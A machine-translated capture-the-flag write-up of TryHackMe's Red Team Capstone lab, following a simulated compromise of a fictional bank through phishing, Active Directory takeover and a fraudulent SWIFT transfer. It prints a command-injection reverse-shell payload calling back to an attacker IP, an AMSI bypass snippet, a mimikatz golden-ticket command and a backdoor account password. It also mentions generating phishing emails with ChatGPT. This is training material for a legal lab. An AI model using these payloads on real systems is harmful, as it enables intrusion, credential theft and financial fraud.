#RedTeamCapstoneChallenge

<img src="https://tryhackme-badges.s3.amazonaws.com/Sugobet.png" alt="TryHackMe">

**Note: I will not mention the relevant flags here, just concentrate on typing; you can try it with each hostname by yourself**

## Challenge the author's sentence

This room is rated hard, but since it's a mountain in front of you, it could be rated crazy. But when you break it down into the stages of compromises that have to be achieved, none of those stages are actually hard; they just require attention to detail and the logical application of what you should have learned through the red teaming learning path. Normal red team engagements last weeks, sometimes months. Take this into consideration when tackling the challenge.

This network was created to simulate what you would typically find in real customer engagements during red teaming. None of the attack paths in this challenge were created as fictional CTFs. Instead, you'll find misconfigurations and vulnerabilities that I've personally seen in engagements. But you also have real challenges that I had to face, some tools or techniques simply don't work out of the box, or you have to use ingenuity to make something behave the way you want. Also, in actual engagement, the answer is never to pick up the phone and tell the customer "I can't compromise this hosting because the tools I'm using show XYZ errors". That's not going to cut it at all. The answer is to start the debugging process, try to understand what's different, and use that knowledge to make adjustments so that the attack can still be executed.

Some advice from me as you climb this mountain - first, make sure you read the information provided properly. This information is intended to help you avoid trying it as a CTF, which can lead to frustration. Second, this challenge has multiple compromises at every stage. If you insist on trying to get a particular attack to work, my suggestion is to do additional enumerations to try and discover other attack paths. Find your own golden path to complete a challenge, then go back and try to conquer other attack paths.

## Most important thing to remember to conquer this apex challenge

- This is a red team practice, not a capture the flag game. Your CTF skills alone are not enough to complete the challenge.
- This exercise tests the skills you learned in the Red Team Learning Path. We recommend completing at least 80% of this path before attempting the challenge. If you get stuck, go back to the path as it covers the techniques you need.
- There are different ways to complete this exercise. If you have trouble with a particular attack, try different methods and approaches.
- Carefully read Task 2 "Project Introduction" as it contains key information needed to complete the challenge.

## Network topology

![Insert picture description here](https://img-blog.csdnimg.cn/575a59a10d7b43a1baf623cb0acf16cb.png)

## Project Overview

Cybersecurity consultancy TryHackMe has approached the Trimento government to red team their bank, The Reserve. Trimento is an island country located in the Pacific Ocean. Small as they may be, they are by no means unrich due to foreign investment. Their Reserve Bank has two main divisions:

- Corporates - The Reserve Bank of Trimento allows foreign investment, so they have a department responsible for corporate banking clients in the country.
- Banking - The Trimento Reserve Bank is responsible for the country's core banking system, which is linked to other banks around the world.

logo:

![Insert picture description here](https://img-blog.csdnimg.cn/b6c5b2d1188544d1b61be972b5ba4969.png)

The Trimento government said the review would cover the entire Reserve Bank, including its perimeter and internal network. They worry that the division of labor between businesses, while boosting the economy, could jeopardize the core banking system due to insufficient segregation. The outcome of this red team engagement will determine whether the corporate division should be spun off into its own company.

The purpose of this assessment is to assess whether the corporate sector could be harmed and, if so, to determine whether it would harm the banking sector. A simulated fraudulent money transfer must be performed to fully demonstrate compromise.

To do this safely, TheReserve will create two new core bank accounts for you. You need proof that you can transfer funds between the two accounts. The only way this works is to access the core backend banking system, SWIFT.

**Note: SWIFT (Society for Worldwide Interbank Financial Telecommunication) is the actual system banks use to transfer money on the back end. In this assessment, a core backend system has been created. However, for security reasons, deliberate inaccuracies were introduced in the process. If you want to learn more about actual SWIFT and its security, feel free to do some research! In other words, the information below here is fabricated. **

To help you understand the project goals, the Trimento government shared some information about SWIFT's backend systems. **SWIFT operates in an isolated security environment with limited access**. While the word impossible should not be used lightly, the chances of the actual hosting infrastructure being compromised are so small that it is fair to say that it is impossible to compromise this infrastructure.

However, the SWIFT backend exposes an **internal web application at http://swift.bank.thereserve.loc/ which TheReserve uses to facilitate transfers**. The government provides general procedures for transfers. To transfer funds:

1) Client requests to transfer funds and receives transfer code.
2) The customer contacts the bank and provides this transfer code.
3) An employee with the Capturer role authenticates to the SWIFT application and captures the transmission.
4) Employee with Approver role reviews the transfer details and if verified, approves the transfer. This must be performed from the jump host.
5) Once the transfer approval is received by the SWIFT network, the transfer is facilitated and the customer is notified.

## Project scope

This section details the project scope.

### range

1) Security testing of TheReserve's internal and external networks, including all IP ranges accessed through VPN connections.
2) OSINTing of TheReserve corporate website, which is publicly available on TheReserve's external network. Note that this means that all OSINT activity should be restricted to the provided network subnets and no external internet OSINTing is required.
3) Phishing of any employee of TheReserve.
4) Attacks on TheReserve employee mailboxes (.11) on WebMail hosts.
5) Use any attack method to accomplish the goal of executing transactions between the provided accounts.

### Out of range

1) Conduct security testing on any site not hosted on the web.
2) Conduct security tests on TryHackMe VPN (.250) and rating servers, or attempt to attack any other user connected to the network.
3) Security testing of any changes to the mail server configuration or its underlying infrastructure made on the WebMail server (.11).
4) Attacking other red team members' mailboxes on webmail portals (.11).
5) External (Internet) OSINT meetups.
6) Attack any host outside the subnet range provided. After completing the following questions, your subnet will appear in the network diagram. This 10.200.X.0/24 network is the only in-range network that meets this challenge.
7) Conduct a DoS attack or any attack that renders other users unable to operate the network.

Before getting started, make sure you understand the following points. Please re-read this task if anything is unclear.

1) The purpose of this assessment is to assess whether the corporate sector can be harmed and, if so, to determine whether it would lead to harm in the banking sector.
2) To demonstrate this compromise, a simulated fraudulent money transfer must be performed with access to the SWIFT core backend banking system.
3) The SWIFT backend infrastructure is secure but exposes an internal web application used by TheReserve to facilitate transfers.
4) The general process for transfers involves segregation of duties to ensure that one employee cannot capture and approve the same transfer at the same time.
5) You have been provided with some information and tools that you may find useful in the exercise, including password policies, but you are free to use your own.
6) There are rules that determine what you are and are not allowed to do. Failure to follow these rules may result in being banned from the Challenge.
7) Once you have gained network access, you will need to register for the challenge via the e-citizen communication portal using the SSH details provided.
8) You need to prove compromise by performing certain steps on compromised hosts. These steps will be provided to you through the e-Citizenship Portal.

## Peripheral information collection

Network topology update

![Insert picture description here](https://img-blog.csdnimg.cn/1843375055854f3495628353cf782b97.png)

### TheReserve website

#### Port Scanning

![Insert picture description here](https://img-blog.csdnimg.cn/79569351778248e7b32d1bbbe46ac59f.png)

#### Web Information Collection

Entering port 80 is the homepage of TheReserve Bank

According to the title, this is October CMS, the version number is unknown

![Insert picture description here](https://img-blog.csdnimg.cn/b2b53968118a45e69ecf7087a3b0c1f9.png)

#### TheReserve Banking Team Information

From this website we can get information about the banking team

- Bank Supervisor Brenda Henderson (female)
- Associate Directors Leslie Morley (female) and Martin Savage (male)
- Corporate executives CEO (Paula) (female), CIO (Christopher) (male), CTO (Antony) (male), CMO (Charlene) (female), and COO (Rhys) (male)
- Assistant Lynda (female)
- Project Manager Roy (male)

The names here are incomplete, and under the directory of these personnel photos, we can get more and more complete

![Insert picture description here](https://img-blog.csdnimg.cn/cbbb29d11c784940a6a85b3a9026160f.png)

![Insert picture description here](https://img-blog.csdnimg.cn/33758d8e062e4cc98c3b1c1e0d256cb5.png)

E-mail: applications@corp.thereserve.loc

Based on this, it is speculated that the user's mailbox is username@corp.thereserve.loc

#### Directory Scanning

on gobuster

![Insert picture description here](https://img-blog.csdnimg.cn/cde4210851c04e4f8445cd8710748f56.png)

There are some vulnerabilities in searchsploit, but it seems that they cannot be exploited for the time being

![Insert picture description here](https://img-blog.csdnimg.cn/339084599af8459291ab481c0f7783cc.png)

### mail server

#### Port Scanning

![Insert picture description here](https://img-blog.csdnimg.cn/061060aac20c434f962f01693ad3649c.png)

opened a lot of ports

![Insert picture description here](https://img-blog.csdnimg.cn/7a888de51eca40979ff0c2fbbc495f5c.png)

port 80 is iis, but nothing seems to

It is a mail server, so port 110 is opened, but we don't have any valid credentials for the time being, trying smb blasting is too slow, don't consider

### OpenVpn Server

Scan the 12 vpn server

![Insert picture description here](https://img-blog.csdnimg.cn/a952c4d4ab964271a741e2759f96fa8c.png)

#### Web Information Collection

Port 80 is a login page

![Insert picture description here](https://img-blog.csdnimg.cn/2b9298009ffe4f8396ca92376f58ca94.png)

Here you can try to blast with the username you just obtained

We have learned about the password policy, and we can use john custom rules to generate some passwords

![Insert picture description here](https://img-blog.csdnimg.cn/ef8fcc6ee2114a548af9c54cf13ec721.png)

Tried hydra blasting, failed

![Insert picture description here](https://img-blog.csdnimg.cn/ee11282079c6409da2b7d1cf5aac6494.png)

#### Directory Scanning

gobuster sweep

![insert picture description here](https://img-blog.csdnimg.cn/c9558f979055409199551b4bd080fe42.png)

get an openvpn file

![Insert picture description here](https://img-blog.csdnimg.cn/d3ca5338a8764ac680a2d6e47ef0cb77.png)

Download it and change the server ip to the current openvpn server

![Insert picture description here](https://img-blog.csdnimg.cn/3b8bbb5b19cd412cb350a79900453a40.png)

Direct connection, note: it may be reconnecting all the time, but it doesn't seem to affect

![Insert picture description here](https://img-blog.csdnimg.cn/b2582a7e8ee74202a1ac6f097660101c.png)

After several times of host survival scans, there is not a single machine in it except the vpn server and itself

#### VPN Server Getshell

Later, after viewing the video of the YouTube boss, I found that the VPN site was actually logged in with an email address.

![Insert picture description here](https://img-blog.csdnimg.cn/589136785a09437296bae3e72606d012.png)

logo

![Insert picture description here](https://img-blog.csdnimg.cn/20e1a9e4548847dfadbb55400ae02a29.png)

Here you can request the ovpn file. I pass the filename parameter. I associate it from sql injection to command injection. There is a suffix and no echo

Use backticks, try nc to try your luck to connect back to the attack plane, and it succeeds

![Insert picture description here](https://img-blog.csdnimg.cn/8c9397b468b34c41ae417f8650a5c09e.png)

Direct old method getshell

    ?filename=`mkfifo+/tmp/f1%3bnc+10.50.116.23+443+<+/tmp/f1+|+/bin/bash+>+/tmp/f1`

![Insert picture description here](https://img-blog.csdnimg.cn/5c477ba51ce34347a8364a8c82d70a14.png)

#### Privilege Escalation - cp

View sudo -l

![Insert picture description here](https://img-blog.csdnimg.cn/318f020e019b4540b6206d92a00c6d56.png)

Very simple extraction method, directly overwrite passwd

![Insert picture description here](https://img-blog.csdnimg.cn/9cfaad78a5dd42da80f4c118e07eefe8.png)

#### Persistence

Harden the shell first

![Insert picture description here](https://img-blog.csdnimg.cn/b9b6f6dc43824cb5852ef3409711357b.png)

Edit the ssh configuration file to allow password login

![Insert picture description here](https://img-blog.csdnimg.cn/88b0d3c9233c41ba8a791f16b4c91d18.png)

Create an ssh account and add yourself to the sudo group to facilitate follow-up actions


![Insert picture description here](https://img-blog.csdnimg.cn/cfb41bd2cc384b3e859f11047a692132.png)

1q2w3e4r!@#$
usermod -a -G sudo hackerMM


#### sshuttle builds a tunnel

![Insert picture description here](https://img-blog.csdnimg.cn/4ba0a137ca2e480196aabfc5602fd346.png)


## Phishing campaign targeting banking team

Go to e-citizen to register email address

![Insert picture description here](https://img-blog.csdnimg.cn/d80c66c951e74d1297d55e2fb6b35a67.png)

As you can see, we have purchased a domain name that was used for cybersquatting, to be used for phishing.
Once the webmail server has been discovered, you can use these details to verify and recover other item information from your mailbox.
Once you have performed a breach of the network, please authenticate with e-Citizen to provide updates to the government. If your updates are sufficient, you'll get a flag to indicate progress.

### Set gophish

I won't mention here how to setup gophish as THM has already taught and only document the necessary

Here, in order to make our phishing website more real, I choose to apply their bank vpn login page

![Insert picture description here](https://img-blog.csdnimg.cn/ffa69838878b4d00b4fee2484471b8b0.png)

Tick capture password

After setting up the phishing email template and phishing page, add the target mailbox, we have obtained the username of the target team, and the mailbox can also be guessed

![Insert picture description here](https://img-blog.csdnimg.cn/d5cd0da4372344f2b49857c09f805982.png)

add event

![Insert picture description here](https://img-blog.csdnimg.cn/b93ee09e6a734950995eebdfdf1d2e9d.png)

![Insert picture description here](https://img-blog.csdnimg.cn/69c1dc064c284829a5bb59355cc78e69.png)

### Spear Phishing

Check the mailbox and find that some people reply only deal with internal matters, not external matters

But one of the emails pointed us in another direction:

![Insert picture description here](https://img-blog.csdnimg.cn/e86954de31424e2994ff1c62b880bfa1.png)

    goodbye

    thank you for your letter. However, it doesn't seem to be related to my business unit. Please submit your questions to the correct BU.

    greeting,
    Emily Harvey

I'm guessing it will handle our letters, but only if the content of the mail is of interest to her

Here we go back to the bank's website and find out that she and the first lady handle letters from outside

![Insert picture description here](https://img-blog.csdnimg.cn/762969e3a9c44ca2b3072c243ffc4b59.png)

I think we need to do a spear phishing campaign specifically targeting her two

I try to generate email templates about topics via chatgpt

![Insert picture description here](https://img-blog.csdnimg.cn/815a1d0529524fb2ac9aa14da991af03.png)

But unfortunately, after this email was sent, the manager did not reply to us, and did not click on the link. Dark Feather suggested to try VBA macro

I tried msf to generate a VBA payload, but still did not reply to the email, guessing it was blocked by the firewall.

### LNK hijacking

Try lnk hijacking, using mslink

![Insert picture description here](https://img-blog.csdnimg.cn/9da5897096cd482f8bef19b598f06e4f.png)

send email

![Insert picture description here](https://img-blog.csdnimg.cn/ced8440f42a14baaadadf85a7e1ad271.png)

Open smbserver and successfully visit

![Insert picture description here](https://img-blog.csdnimg.cn/3bef70d8f238464aa452161ee7d0b18c.png)

Here it proves that our VBA should also be successful, but it has not been connected. We can confirm it now

I tried to use msf to generate a reverse shell payload directly, but it didn’t connect, it should be WinDefender

Try direct ntlm relay

![Insert picture description here](https://img-blog.csdnimg.cn/fb124883817f42a3af176589863e73fd.png)

fail

### WinDefender C# Avoid killing

Try to use the anti-kill knowledge taught by THM to do a simple anti-kill by yourself last time, and successfully getshell

![Insert picture description here](https://img-blog.csdnimg.cn/0374b135c80141ff846248348ab7a0ce.png)

Log in to the ssh of the .250 host and get flag1

![Insert picture description here](https://img-blog.csdnimg.cn/f281ce8d43df4d81a153d4db9c638fe4.png)

Since the shellcode is generated by msf, the execution command will still be killed when running. Here, a new process can be directly generated to avoid the memory detection of WinDefender, directly powershell or cmd

![Insert picture description here](https://img-blog.csdnimg.cn/64658230e61943d38834a94d27548cab.png)

so that it will no longer be detected at runtime

Due to the existence of AV, we cannot use WinPEAS and sharphound at will, here we can use SharpHound's powershell script, and then go to bypass AMSI

```powershell
$a = [Ref].Assembly.GetType('System.Management.Automation.Ams'+'iUtils')
$b = $a.GetField('ams'+'iInitFailed','NonPublic,Static')
$b.SetValue($null, $true)
```

Segment Bypass

![Insert picture description here](https://img-blog.csdnimg.cn/28db0ac1b3c04770a8f06999b05f2c16.png)

---

---

---

## Intranet information collection

### Intranet surviving host and port information collection

on the vpn server

Since the nmap scan traffic does not go through the sshuttle tunnel, here we have to pass an nmap binary executable file to scan on the server to collect the survival of intranet hosts

![Insert picture description here](https://img-blog.csdnimg.cn/755313fda92c47a0a7f34365277117c7.png)

### CORP Subdomain - Domain Information Collection - SharpHound Bypass

on WRK1

After bypassing AMSI, it is found that it will be killed by WinDefender again. Here we have to consider confusing SharpHound

    https://github.com/Flangvik/ObfuscatedSharpCollection

This project contains obfuscated versions of many executables, here the obfuscated sharphound can be used

![Insert picture description here](https://img-blog.csdnimg.cn/6cadaceefd1f46e9963a45a46d82f741.png)

Collect domain information

![Insert picture description here](https://img-blog.csdnimg.cn/8fb52f48f63a498390a040a05b2a12a0.png)

After the attack machine starts the smbserver, it returns the data packet and waits for the next step to exploit

### WinPEAS WRK1 local information collection

Go to winPEAS, extract the password of WRK1\\Administrator, and wait for the next step to use

![Insert picture description here](https://img-blog.csdnimg.cn/e122d44bcba84c66946ea544292714b4.png)

## CORP subdomain - preliminary AD domain enumeration

We currently have two sets of credentials, and a plaintext password for WRK1/Administrator (unknown if it works)

You can try conventional attack methods

### Kerberoasting

straightconnect impacket

![Insert picture description here](https://img-blog.csdnimg.cn/90a87f8e7f7b46f38419ca3bba7a4cf9.png)

Go directly to hashcat

![Insert picture description here](https://img-blog.csdnimg.cn/a49bfc09a9f44fa99c2998ed03e4079a.png)

I only got the account password of svcScanning, but it is enough

![Insert picture description here](https://img-blog.csdnimg.cn/28c7d3994a614df898e20820e09dcc57.png)


### analyze

The SVCBACKUPS group allows logging in to server1 and server2, and can modify the GPO of DC BACKUPS through the machine account of the server

![Insert picture description here](https://img-blog.csdnimg.cn/138793db2dbf4f098c780abfb95dcb78.png)

## CORP Subdomain - AD Lateral Movement - SERVER1/SERVER2

### SERVER1

With the credentials and information, we directly wait for server1 and server2 such as evil-winrm

![Insert picture description here](https://img-blog.csdnimg.cn/202e3051c8b34966912010231966eb6d.png)

Check whoami and find that we belong to the administrators group

![Insert picture description here](https://img-blog.csdnimg.cn/6b6e3a168776426892d84f68fdf36ed9.png)

Enter rdp and turn off the antivirus

![Insert picture description here](https://img-blog.csdnimg.cn/ce6ce7de7a8f4e519a247190672740a3.png)

mimikatz simply searched for a wave but didn't find anything

Next, use the secretsdump of impacket to obtain the plaintext password of svcBackups

![Insert picture description here](https://img-blog.csdnimg.cn/016dfb6b79144650868b54b550bd13b3.png)

## CORP subdomain - AD exploit

### DC

According to past experience, this kind of account should have permission to dump ntds.dit

![Insert picture description here](https://img-blog.csdnimg.cn/e6f8007a120748deb7cc59006d4a259b.png)

Log in directly with nt hash

![Insert picture description here](https://img-blog.csdnimg.cn/bec6ac0fc3784140ade58e8bb911b468.png)

### Note: If you want to get flag4, you can directly use the hash of the DA group to log in with xfreerdp pth, of course, you can also add it to the account by yourself

### Simple Domain Persistence

Add accounts directly to DA group

![Insert picture description here](https://img-blog.csdnimg.cn/70cc245e6b2a4275a15908e53bc62491.png)

Turn off WinDefender by the way

![Insert picture description here](https://img-blog.csdnimg.cn/bc96016654eb445b8e3a4865ef97ae62.png)


## Network topology update

![Insert picture description here](https://img-blog.csdnimg.cn/61cab511397b4b42a8f2dcac4e7cc76f.png)

---

---

---

## Take over parent domain - move between domains

### Inter-Realm TGT - Inter-Realm Golden Ticket

Take over the parent domain with a two-way trust

Use the AD-RSAT cmdlet to obtain the sid of the corp subdomain DC and the sid of the EA group

krbtgt has been obtained during the previous DCsync, and directly started to make golden tickets

    mimikatz # kerberos::golden /user:Administrator /domain:corp.thereserve.loc /sid:S-1-5-21-170228521-1485475711-3199862024-1009 /service:krbtgt /rc4:0c757a3445acb94a654554f3ac5 29ede /sids:S-1 -5-21-1255581842-1300659601-3764024703-519 /ptt

![Insert picture description here](https://img-blog.csdnimg.cn/f04a0723d8304c5c8680e2c8e247718c.png)

You can also use /export to export the kirbi tgt file and save it to the attack machine

Verify that tgt is valid

![Insert picture description here](https://img-blog.csdnimg.cn/d577cdbdc5474a348af9aeaacfe33cc6.png)

### Move to RootDC

Here psexec past rootDC

![Insert picture description here](https://img-blog.csdnimg.cn/b55ff5f568914df8aed7aad6b88fee34.png)

**Since we are currently logged in as corp\\Administrator, we will fail when trying to add our own account on RootDC**

But we have the right to directly modify the password of thereserve.loc\\Administrator

![Insert picture description here](https://img-blog.csdnimg.cn/f2f6557d0ae34676ae2fd9eaa03cc9ee.png)

Then log in thereserve.loc\\Administrator from corpDC and then log in rootDC via psexec

### Add EA group backdoor account

![Insert picture description here](https://img-blog.csdnimg.cn/40018536798d410eb8612ebf5ea02a4c.png)

**Note, there should be no trust relationship between the bank subdomain and the corp subdomain, which means that we cannot directly access the bank subdomain from the corp subdomain**

**But we can take advantage of the two-way trust between the subdomain and the parent domain. We can log in to RootDC from corpDC first, and then access the Bank subdomain from RootDC**

**In addition, we also need to create a separate account under the bank subdomain and grant DA group permissions**

At this point, we have taken control of the entire domain and have full control of all domains

---

---

---

## Bank Transfer


### reverse ssh
The JMP machine can directly communicate with our attack machine, here we directly use ssh to connect to the attack machine as a proxy

![Insert picture description here](https://img-blog.csdnimg.cn/f5442242ce5642d3b8377c375fc0beec.png)

Configure the browser proxy plugin

![Insert picture description here](https://img-blog.csdnimg.cn/413db50558c5428fb62002124965a810.png)

![Insert picture description here](https://img-blog.csdnimg.cn/4d5e20fa0653450eb05f1630e8f45ea3.png)

![Insert picture description here](https://img-blog.csdnimg.cn/16703a58ecf0496a9784148b995a3a24.png)

We will get a bank account on the .250 machine, use it to log in

Transfer 10 million to the designated account

![Insert picture description here](https://img-blog.csdnimg.cn/1f9cc3e83f2b4db49d33a99ce6fd86d2.png)

---

When searching, I accidentally found a py script with a set of credentials in it, which is the account of the bank transfer approver

![Insert picture description here](https://img-blog.csdnimg.cn/f974e04516604dd1b913a5df2e1f2e12.png)

Check the group the user is in, and you can guess that this group should be responsible for the final payment

![Insert picture description here](https://img-blog.csdnimg.cn/b81d1762ee9046aa97dec668bd5ea9c3.png)

---

Following the user group, I found another group, which should be responsible for the preliminary review

![Insert picture description here](https://img-blog.csdnimg.cn/48be716ba1e445b4aeadb25f5a7d0731.png)

---

Under the .61 machine, there are two PA group accounts logged in here

Then the PC group can also or is most likely to be active under WORK1 and WORK2

Log in to WORK1, and found that there is indeed an account in the PC group to log in

![Insert picture description here](https://img-blog.csdnimg.cn/6089b824cc1e4360bf0db04a492d5986.png)

change password directly

![Insert picture description here](https://img-blog.csdnimg.cn/1f41b64a158549098a1bf5e2f70ec1e1.png)

rdp login past

![Insert picture description here](https://img-blog.csdnimg.cn/6dad767ab6544ca38bc349ca19167cad.png)

Although there is nothing in Chrome, there is a file in the user's home directory, which should record his website login password

![Insert picture description here](https://img-blog.csdnimg.cn/3110dc69daf441b0a96c13f5f88d0a5b.png)

Successfully logged in with this credential

![Insert picture description here](https://img-blog.csdnimg.cn/a54c2c8a4c0d45648ab1e8fc30efa042.png)

Go to the background and approve your transfer application

![Insert picture description here](https://img-blog.csdnimg.cn/5488273972a643389a6031092f783b12.png)

Log out, go back to the r.davies account, and agree to the transfer

![Insert picture description here](https://img-blog.csdnimg.cn/6b9ae55d92d24324b7911beef45b199a.png)

### final transfer

This is the final check! Don't try this if you haven't done all the other flags.
Once done, follow these steps:
1. Using your DESTINATION credentials, authenticate to SWIFT
2. Verify the transaction using the PIN provided in the SWIFT Access Token email.
3. Using your capture access, capture the verified transaction.
4. Using your approver access rights, approve the captured transaction.
5. Profit?

Once you have approved the offered transaction, enter Y to verify your access.

**This is the same as the previous operation, just one more step of PIN code confirmation, I will not repeat the discussion here**

**It is worth noting here that do not re-create the transfer request, but confirm the PIN code against the original 10 million one**

## Topology update

![Insert picture description here](https://img-blog.csdnimg.cn/96f3cd37a1be42e5a11d0e928309785b.png)

## Finish

This red team challenge is the best challenge I have played in thm for so long. It is indeed almost 7-80% of the test points of the red team path. In fact, looking back at the whole challenge, there is actually no difficulty, as long as you are serious In THM, there is no difficulty at all. This challenge can be used as a test to see if you have passed the red team path, nothing more.

This red team challenge is also the first time for me. Completing this challenge also means that I am almost ready to go to htb. I am in TryHacKMe has been studied for 173 days so far, I have learned from zero to now, only I know how much I have learned, so this is the reason why I really love thm, but I also want to go to a higher place, step into the university Follow in guys' footsteps, **Thanks to TryHackMe**

![Insert picture description here](https://img-blog.csdnimg.cn/83c8eda476364fffaeb6237807b6a5cf.png)